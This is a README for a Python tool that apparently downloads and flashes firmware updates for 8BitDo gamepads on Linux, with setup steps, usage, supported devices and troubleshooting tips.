# 🎮 8bitdo_update - Effortless Gamepad Firmware Updates

[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Awkoawkontl/8bitdo_update/releases)

## 🎯 Introduction

8bitdo_update is a simple Python tool that helps you automatically download and flash firmware updates for your 8BitDo gamepads on Linux. This tool eliminates the need for the official Upgrade Tool, which only works on Windows and macOS.

## 🚀 Getting Started

### 1. Check System Requirements

Before you start, ensure that your system meets the following requirements:

- A Linux operating system (Ubuntu, Fedora, etc.)
- Python 3.6 or newer
- Basic command-line knowledge (open a terminal)

### 2. Download the Tool

To get the latest version of 8bitdo_update, visit this page to download: [Releases Page](https://github.com/Awkoawkontl/8bitdo_update/releases).

### 3. Install Dependencies

Open your terminal and run the following command to ensure you have the necessary Python dependencies:

```bash
pip install -r requirements.txt
```

## ⚙️ Running the Tool

### 1. Navigate to the Tool Directory

Use the `cd` command to change to the directory where you downloaded 8bitdo_update.

```bash
cd path/to/8bitdo_update
```

### 2. Start the Update Process

To start using the tool, run the following command:

```bash
python updater.py
```

You will see an interactive menu guiding you through the update process.

## 💡 Using the Interactive Menu

1. **Select Your Gamepad:** The menu displays all supported 8BitDo gamepads. Choose the one you have.
2. **Download Firmware:** The tool automatically fetches the latest firmware from 8BitDo's servers.
3. **Version Selection:** You can choose to update to a stable release or a beta version if available.
4. **Flashing the Firmware:** The tool flashes the firmware with a single command.

## 🔄 Automatic Device Detection

You don’t need to worry about connecting the gamepad. The tool automatically detects your connected 8BitDo gamepad, making the process straightforward.

## 📥 Cleanup

After flashing, the tool can remove any downloaded firmware files if you choose this option. This helps keep your system tidy.

## ✅ User-Friendly Experience

8bitdo_update provides clear instructions and confirmations at every step. You’ll always know what’s happening during the firmware update process.

## 🕹️ Supported Gamepads

This tool supports various 8BitDo gamepads, including but not limited to:

- 8BitDo SN30 Pro
- 8BitDo Pro 2
- 8BitDo Zero 2

For a complete list of supported devices, refer to the documentation included with the tool.

## 📚 Troubleshooting

If you encounter any issues while using 8bitdo_update, consider the following common problems:

- **Issue:** The gamepad isn’t detected.
  - **Solution:** Make sure it’s properly connected, and try using a different USB port.

- **Issue:** The firmware won’t download.
  - **Solution:** Check your internet connection and ensure you’re running the latest version of the tool.

- **Issue:** The flashing process fails.
  - **Solution:** Restart your gamepad and run the updater again.

## 📖 Additional Resources

To learn more about 8bitdo_update, check out the following resources:

- [GitHub Issues Page](https://github.com/Awkoawkontl/8bitdo_update/issues) - For bug reports and feature requests.
- [Community Forum](https://forum.8bitdo.com) - Connect with other users and share experiences.

## 🎉 Community Contributions

We welcome contributions! If you’d like to assist in improving 8bitdo_update, feel free to submit pull requests or suggest changes.

## 📥 Download & Install

To download and install the latest version of 8bitdo_update, visit this page to download: [Releases Page](https://github.com/Awkoawkontl/8bitdo_update/releases).

The tool simplifies the process of updating your gamepad's firmware, ensuring you stay current with the latest features and improvements from 8BitDo. Enjoy your gaming experience!